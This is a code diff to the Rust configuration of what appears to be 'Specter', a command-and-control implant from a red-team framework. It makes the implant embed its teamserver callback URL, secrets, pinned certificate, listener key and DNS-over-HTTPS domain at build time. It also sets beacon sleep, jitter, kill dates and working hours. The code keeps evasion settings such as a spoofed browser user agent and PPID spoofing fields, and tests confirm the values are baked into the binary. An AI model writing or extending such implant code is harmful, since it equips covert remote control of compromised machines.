@@ -264,18 +264,25 @@ impl SpecterConfig {
 impl Default for SpecterConfig {
     fn default() -> Self {
         Self {
-            callback_url: String::from("https://127.0.0.1:40056/"),
-            init_secret: None,
-            init_secret_version: None,
+            // Bake in the teamserver callback URL when built with
+            // SPECTER_CALLBACK_URL set.  Falls back to a loopback default
+            // that is only useful for local testing.
+            callback_url: option_env!("SPECTER_CALLBACK_URL")
+                .map(str::to_string)
+                .unwrap_or_else(|| String::from("https://127.0.0.1:40056/")),
+            init_secret: option_env!("SPECTER_INIT_SECRET").map(str::to_string),
+            init_secret_version: parse_compile_env_u8(),
             // Baked in at compile time — set SPECTER_PINNED_CERT_PEM when building the implant.
             pinned_cert_pem: option_env!("SPECTER_PINNED_CERT_PEM").map(str::to_string),
-            user_agent: String::from(
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-            ),
-            sleep_delay_ms: 5000,
-            sleep_jitter: 20,
-            kill_date: None,
-            working_hours: None,
+            user_agent: option_env!("SPECTER_USER_AGENT").map(str::to_string).unwrap_or_else(|| {
+                String::from(
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+                )
+            }),
+            sleep_delay_ms: parse_compile_env_u32("SPECTER_SLEEP_DELAY_MS").unwrap_or(5000),
+            sleep_jitter: parse_compile_env_u32("SPECTER_SLEEP_JITTER").unwrap_or(20),
+            kill_date: parse_compile_env_i64(),
+            working_hours: parse_compile_env_i32(),
             ppid_spoof: None,
             verbose: false,
             sleep_technique: 0,
@@ -288,11 +295,44 @@ impl Default for SpecterConfig {
             inject_spoof_addr: None,
             spawn64: None,
             spawn32: None,
-            doh_domain: None,
-            doh_provider: DohProvider::Cloudflare,
-            listener_pub_key: None,
+            doh_domain: option_env!("SPECTER_DOH_DOMAIN").map(str::to_string),
+            doh_provider: option_env!("SPECTER_DOH_PROVIDER")
+                .and_then(|s| match s {
+                    "cloudflare" => Some(DohProvider::Cloudflare),
+                    "google" => Some(DohProvider::Google),
+                    _ => None,
+                })
+                .unwrap_or(DohProvider::Cloudflare),
+            listener_pub_key: option_env!("SPECTER_LISTENER_PUB_KEY").map(str::to_string),
         }
     }
+}
+
+/// Parse a compile-time string env var into a value of type `T`, returning
+/// `None` when unset, empty, or unparseable — the last case falls back to
+/// the hard-coded default rather than failing the build.
+fn parse_compile_env_u8() -> Option<u8> {
+    option_env!("SPECTER_INIT_SECRET_VERSION")
+        .and_then(|v| if v.is_empty() { None } else { v.parse::<u8>().ok() })
+}
+
+fn parse_compile_env_u32(key: &str) -> Option<u32> {
+    let raw = match key {
+        "SPECTER_SLEEP_DELAY_MS" => option_env!("SPECTER_SLEEP_DELAY_MS"),
+        "SPECTER_SLEEP_JITTER" => option_env!("SPECTER_SLEEP_JITTER"),
+        _ => None,
+    };
+    raw.and_then(|v| if v.is_empty() { None } else { v.parse::<u32>().ok() })
+}
+
+fn parse_compile_env_i64() -> Option<i64> {
+    option_env!("SPECTER_KILL_DATE")
+        .and_then(|v| if v.is_empty() { None } else { v.parse::<i64>().ok() })
+}
+
+fn parse_compile_env_i32() -> Option<i32> {
+    option_env!("SPECTER_WORKING_HOURS")
+        .and_then(|v| if v.is_empty() { None } else { v.parse::<i32>().ok() })
 }
 
 fn parse_doh_provider(s: &str, key: &str) -> Result<DohProvider, SpecterError> {
@@ -342,6 +382,45 @@ mod tests {
     fn empty_callback_url_is_invalid() {
         let config = SpecterConfig { callback_url: String::new(), ..Default::default() };
         assert!(config.validate().is_err());
+    }
+
+    /// Regression for red-cell-c2-g5445: the teamserver bakes callback URL
+    /// and related listener fields via `cargo build`-time env vars.  The
+    /// `default()` implementation must read them via `option_env!` so the
+    /// values end up embedded in the compiled binary, rather than being
+    /// looked up via `std::env::var` only at agent runtime (when the target
+    /// host's environment does not contain them).
+    #[test]
+    fn default_honors_compile_time_callback_url_env() {
+        let config = SpecterConfig::default();
+        let expected = option_env!("SPECTER_CALLBACK_URL").unwrap_or("https://127.0.0.1:40056/");
+        assert_eq!(config.callback_url, expected);
+    }
+
+    #[test]
+    fn default_honors_compile_time_user_agent_env() {
+        let config = SpecterConfig::default();
+        if let Some(expected) = option_env!("SPECTER_USER_AGENT") {
+            assert_eq!(config.user_agent, expected);
+        }
+    }
+
+    #[test]
+    fn default_honors_compile_time_init_secret_env() {
+        let config = SpecterConfig::default();
+        assert_eq!(config.init_secret.as_deref(), option_env!("SPECTER_INIT_SECRET"));
+    }
+
+    #[test]
+    fn default_honors_compile_time_listener_pub_key_env() {
+        let config = SpecterConfig::default();
+        assert_eq!(config.listener_pub_key.as_deref(), option_env!("SPECTER_LISTENER_PUB_KEY"));
+    }
+
+    #[test]
+    fn default_honors_compile_time_doh_domain_env() {
+        let config = SpecterConfig::default();
+        assert_eq!(config.doh_domain.as_deref(), option_env!("SPECTER_DOH_DOMAIN"));
     }
 
     #[test]
